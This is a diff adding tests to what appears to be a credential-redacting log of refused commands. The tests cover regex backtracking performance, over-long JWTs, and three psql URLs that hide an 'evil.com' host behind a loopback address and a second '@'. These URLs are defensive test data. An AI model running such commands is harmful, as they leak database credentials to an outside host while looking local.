@@ -84,6 +84,39 @@ test('a long field of repeated curl flags is checked without a backtracking stal
   assert.ok(process.hrtime.bigint() - started < 1_000_000_000n, 'checked in under a second');
 });
 
+// Each probe is 64 KiB and must be checked well under a second; a quadratic shape takes seconds.
+for (const [name, command] of [
+  ['a run of u after curl -', 'curl -' + 'u'.repeat(65536)],
+  ['an alternating uA run after curl -', 'curl -' + 'uA'.repeat(32768)],
+  ['many curls before a run of u', 'curl '.repeat(500) + ' -' + 'u'.repeat(65536)],
+  ['a long eyJ run', 'eyJ' + 'a'.repeat(65536)],
+]) {
+  test(`${name} is checked in under 200 ms`, (t) => {
+    const dir = scratch(t);
+    const started = process.hrtime.bigint();
+    appendRefusal(entry({ command }), { dir });
+    assert.ok(process.hrtime.bigint() - started < 200_000_000n, 'checked in under 200 ms');
+  });
+}
+
+test('a JWT whose first segment is longer than 3000 characters reads back withheld', (t) => {
+  const dir = scratch(t);
+  appendRefusal(entry({ command: 'eyJ' + 'a'.repeat(3000) + '.eyJ' + 'a'.repeat(10) + '.x' }), { dir });
+  assert.strictEqual(readRefusals({ dir })[0].command, '<withheld: credential>');
+});
+
+for (const command of [
+  'psql http://a:b@localhost:80@evil.com',
+  'psql http://u:p@127.0.0.1:80@evil.com/',
+  'psql http://u:p@localhost:80:90@evil.com/',
+]) {
+  test(`a loopback host followed by a second @ reads back withheld: ${command}`, (t) => {
+    const dir = scratch(t);
+    appendRefusal(entry({ command }), { dir });
+    assert.strictEqual(readRefusals({ dir })[0].command, '<withheld: credential>');
+  });
+}
+
 test('a dev database URL on this machine reads back as it was', (t) => {
   const dir = scratch(t);
   const local = [
